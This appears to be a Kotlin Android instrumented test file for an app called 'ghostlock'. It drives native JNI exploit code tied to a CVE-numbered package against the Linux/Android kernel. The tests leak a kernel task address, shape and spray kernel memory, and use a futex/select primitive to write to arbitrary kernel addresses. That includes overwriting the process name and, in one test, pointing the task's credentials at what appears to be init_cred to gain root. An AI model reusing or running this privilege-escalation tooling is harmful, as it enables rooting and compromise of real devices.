package com.ghostlock.app

import android.util.Log
import androidx.test.ext.junit.runners.AndroidJUnit4
import com.ghostlock.app.engine.ktstep.FutexWordsResult
import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.jni.cve43499.NativeSelectStackJni
import com.ghostlock.app.jni.cve43499.NativePerfTaskProbe
import com.ghostlock.app.jni.cve43499.NativeSelectStackParams
import org.junit.Assert.assertTrue
import org.junit.Assume.assumeTrue
import org.junit.Test
import org.junit.runner.RunWith

/** AVD select JNI edge: real words + fixed config; no uid/root claim. */
@RunWith(AndroidJUnit4::class)
class NativeSelectStackInstrumentedTest {
    @Test
    fun perfTaskCandidateIsLogged() {
        val candidate = NativePerfTaskProbe.probe()
        Log.i("GhostlockPerf", "task-candidate=" + java.lang.Long.toHexString(candidate))
    }

    @Test
    fun selectWritesCommToCurrentTask() {
        val candidate = NativePerfTaskProbe.probe()
        assumeTrue("perf candidate is physical/permissive only", candidate != 0L)
        val before = java.io.File("/proc/self/comm").readText().trim()
        val syscalls = NativeKernelSyscalls()
        val prepare = com.ghostlock.app.engine.ktstep.NativePrepare43499Port()
        assertTrue(prepare.open() is com.ghostlock.app.engine.ktstep.SyscallResult.Ok)
        val madePage = prepare.prepare(
            com.ghostlock.app.engine.ktstep.NativePrepareParams(
                pageSize = 4096, mmStructSize = 1024, mmSlabOrder = 2, collisions = 4,
                threadCount = 4, possibleCpus = 8, proofCount = 4, proofSeed = 0,
                rangeStart = 0xffffff8000000000uL.toLong(), rangeEnd = 0xffffffc000000000uL.toLong(),
                counterOffset = 0x1000, wakeRounds = 64, roundTimeoutUs = 1000, headerBytes = 0x1000,
                totalPokes = 32768, wordBytes = 8, handleBytes = 8, preGroups = 1,
                preShapedGroups = 0, sprayGroups = 1, postGroups = 1, leakGroups = 1,
                snitchCollisions = 4, maxAttempts = 4, pollRounds = 64, socketBuffer = 0x100000,
                mainCpu = 0, sweepTags = false,
            ),
        )
        assertTrue(madePage is com.ghostlock.app.engine.ktstep.NativePrepareResult.Ok)
        val facts = madePage as com.ghostlock.app.engine.ktstep.NativePrepareResult.Ok
        val base = facts.base + (-0xE80L)
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is FutexWordsResult.Ok -> made.words
            is FutexWordsResult.Errno -> error("words:" + made.code)
        }
        try {
            val params = NativeSelectStackParams(
                target = candidate + 0x7a8L, value = candidate + 0x7a0L, fdCount = 320, attempts = 4,
                fakeRight = candidate + 0x7a0L,
                selectWaitUs = 250000L, niceModulus = 19, waiterShift = -2, compact = true,
                fakeWaiterPrio = 140L, fakeTask = base + 0x1280L, fakeLock = base + 0x0E80L,
                wordTask = 8, wordLock = 9, wordTreePc = 2, wordTreeRight = 3, wordTreeLeft = 4,
                wordPiPc = 5, wordPiRight = 6, wordPiLeft = 7, wordWakePrio = 10,
                wordDeadline = 11, wordWwCtx = 12,
                waitWord = words.wait.address, chainWord = words.chain.address,
                targetWord = words.target.address, selected = intArrayOf(64, 65, 66),
            )
            val result = NativeSelectStackJni.run(params)
            val after = java.io.File("/proc/self/comm").readText().trim()
            Log.i("GhostlockSelect", "comm-before=" + before + " after=" + after + " result=" + result)
        } finally {
            words.close()
            syscalls.close(facts.shapingFd)
            syscalls.close(facts.shapingPeerFd)
            prepare.close()
        }
    }

    @Test
    fun selectScansCommOffsets() {
        val candidate = NativePerfTaskProbe.probe()
        assumeTrue("perf candidate is physical/permissive only", candidate != 0L)
        val syscalls = NativeKernelSyscalls()
        val prepare = com.ghostlock.app.engine.ktstep.NativePrepare43499Port()
        assertTrue(prepare.open() is com.ghostlock.app.engine.ktstep.SyscallResult.Ok)
        val madePage = prepare.prepare(
            com.ghostlock.app.engine.ktstep.NativePrepareParams(
                pageSize = 4096, mmStructSize = 1024, mmSlabOrder = 2, collisions = 4,
                threadCount = 4, possibleCpus = 8, proofCount = 4, proofSeed = 0,
                rangeStart = 0xffffff8000000000uL.toLong(), rangeEnd = 0xffffffc000000000uL.toLong(),
                counterOffset = 0x1000, wakeRounds = 64, roundTimeoutUs = 1000, headerBytes = 0x1000,
                totalPokes = 32768, wordBytes = 8, handleBytes = 8, preGroups = 1,
                preShapedGroups = 0, sprayGroups = 1, postGroups = 1, leakGroups = 1,
                snitchCollisions = 4, maxAttempts = 4, pollRounds = 64, socketBuffer = 0x100000,
                mainCpu = 0, sweepTags = false,
            ),
        )
        assertTrue(madePage is com.ghostlock.app.engine.ktstep.NativePrepareResult.Ok)
        val facts = madePage as com.ghostlock.app.engine.ktstep.NativePrepareResult.Ok
        val base = facts.base + (-0xE80L)
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is FutexWordsResult.Ok -> made.words
            is FutexWordsResult.Errno -> error("words:" + made.code)
        }
        try {
            for (offset in longArrayOf(0x7a0L, 0x7a8L, 0x7b0L)) {
                val before = java.io.File("/proc/self/comm").readText().trim()
                val params = NativeSelectStackParams(
                    target = candidate + offset, value = candidate + offset - 8L, fdCount = 320, attempts = 4,
                    fakeRight = candidate + offset - 8L,
                    selectWaitUs = 250000L, niceModulus = 19, waiterShift = -2, compact = true,
                    fakeWaiterPrio = 140L, fakeTask = base + 0x1280L, fakeLock = base + 0x0E80L,
                    wordTask = 8, wordLock = 9, wordTreePc = 2, wordTreeRight = 3, wordTreeLeft = 4,
                    wordPiPc = 5, wordPiRight = 6, wordPiLeft = 7, wordWakePrio = 10,
                    wordDeadline = 11, wordWwCtx = 12,
                    waitWord = words.wait.address, chainWord = words.chain.address,
                    targetWord = words.target.address, selected = intArrayOf(64, 65, 66),
                )
                val result = NativeSelectStackJni.run(params)
                val after = java.io.File("/proc/self/comm").readText().trim()
                Log.i("GhostlockSelect", "comm-offset=" + java.lang.Long.toHexString(offset) + " before=" + before + " after=" + after + " result=" + result)
            }
        } finally {
            words.close()
            syscalls.close(facts.shapingFd)
            syscalls.close(facts.shapingPeerFd)
            prepare.close()
        }
    }

    @Test
    fun selectWritesInitCredToCurrentTask() {
        val candidate = NativePerfTaskProbe.probe()
        assumeTrue("perf candidate is physical/permissive only", candidate != 0L)
        val syscalls = NativeKernelSyscalls()
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is FutexWordsResult.Ok -> made.words
            is FutexWordsResult.Errno -> error("words:" + made.code)
        }
        try {
            val params = NativeSelectStackParams(
                target = candidate + 0x798L,
                value = 0xffffff80aa66eef0uL.toLong(),
                fakeRight = 0xffffff80aa66eef0uL.toLong(),
                fdCount = 320, attempts = 1,
                selectWaitUs = 250000L, niceModulus = 19, waiterShift = -2, compact = true,
                fakeWaiterPrio = 140L, fakeTask = 0L, fakeLock = 0L,
                wordTask = 8, wordLock = 9, wordTreePc = 2, wordTreeRight = 3, wordTreeLeft = 4,
                wordPiPc = 5, wordPiRight = 6, wordPiLeft = 7, wordWakePrio = 10,
                wordDeadline = 11, wordWwCtx = 12,
                waitWord = words.wait.address, chainWord = words.chain.address,
                targetWord = words.target.address,
                selected = intArrayOf(64, 65, 66),
            )
            val result = NativeSelectStackJni.run(params)
            Log.i("GhostlockSelect", "cred-write-result=" + result)
            Log.i("GhostlockSelect", "uid-after=" + android.os.Process.myUid())
        } finally {
            words.close()
        }
    }

    @Test
    fun selectJniReturnsAResultAndCleansUp() {
        val syscalls = NativeKernelSyscalls()
        val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
            is FutexWordsResult.Ok -> made.words
            is FutexWordsResult.Errno -> error("words:" + made.code)
        }
        try {
            val params = NativeSelectStackParams(
                target = 0x1000L, value = 0xff8L, fdCount = 320, attempts = 4, fakeRight = 0xff8L,
                selectWaitUs = 250000L, niceModulus = 19, waiterShift = -2, compact = true,
                fakeWaiterPrio = 140L, fakeTask = 0L, fakeLock = 0L,
                wordTask = 8, wordLock = 9, wordTreePc = 2, wordTreeRight = 3, wordTreeLeft = 4,
                wordPiPc = 5, wordPiRight = 6, wordPiLeft = 7, wordWakePrio = 10,
                wordDeadline = 11, wordWwCtx = 12,
                waitWord = words.wait.address, chainWord = words.chain.address,
                targetWord = words.target.address,
                selected = intArrayOf(64, 65, 66),
            )
            val result = NativeSelectStackJni.run(params)
            Log.i("GhostlockSelect", "select-result=" + result)
            assertTrue("jni result", result != null)
            assertTrue("route success", result!!.ok)
        } finally {
            words.close()
        }
    }
}
